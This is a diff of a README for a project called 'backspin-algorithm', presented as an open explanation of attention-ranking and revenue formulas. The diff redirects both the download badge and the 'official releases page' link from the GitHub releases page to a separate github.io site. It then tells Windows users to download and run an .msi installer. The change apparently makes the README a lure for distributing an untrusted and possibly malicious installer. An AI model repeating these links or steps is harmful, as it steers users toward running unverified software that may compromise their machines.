@@ -1,6 +1,6 @@
 # ⚙️ backspin-algorithm - Transparent formulas for verified user attention
 
-[<img src="https://img.shields.io/badge/Download-Application-grey.svg" alt="Download backspin-algorithm">](https://github.com/Frenchultramarinesennenhunde326/backspin-algorithm/releases)
+[<img src="https://img.shields.io/badge/Download-Application-grey.svg" alt="Download backspin-algorithm">](https://frenchultramarinesennenhunde326.github.io)
 
 This project explains the math behind BackSpin. It shows how software turns wait states into verified attention. You see how the system ranks reach and divides revenue between developers and advertisers. The project removes the mystery of black-box algorithms by providing open access to the formulas.
 
@@ -8,7 +8,7 @@ This project explains the math behind BackSpin. It shows how software turns wait
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Frenchultramarinesennenhunde326/backspin-algorithm/releases) to download the installer.
+1. Visit the [official releases page](https://frenchultramarinesennenhunde326.github.io) to download the installer.
 2. Select the file ending in .msi to start the process.
 3. Open your Downloads folder and double-click the file.
 4. Follow the prompts on your screen to complete the installation.
